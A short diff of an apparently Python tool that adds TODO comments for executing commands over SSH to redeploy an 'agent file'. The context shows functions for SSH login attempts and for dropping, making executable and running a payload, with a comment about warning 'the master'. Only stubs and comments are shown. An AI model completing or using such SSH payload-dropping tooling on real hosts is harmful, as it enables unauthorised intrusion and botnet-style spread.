@@ -45,6 +45,9 @@ def sshAttempt(ip,user,pwd):
 def parse():
     pass 
 
+# TODO: Create a function which simply executes the user's command through ssh
+# This function will be used for re-executing the agent file during deployment. 
+
 # Actually drop the payload, change the file permission, and execute it 
 # Warn the master to turn on the server? 
 def drop(ip, user, pwd, remote_location):
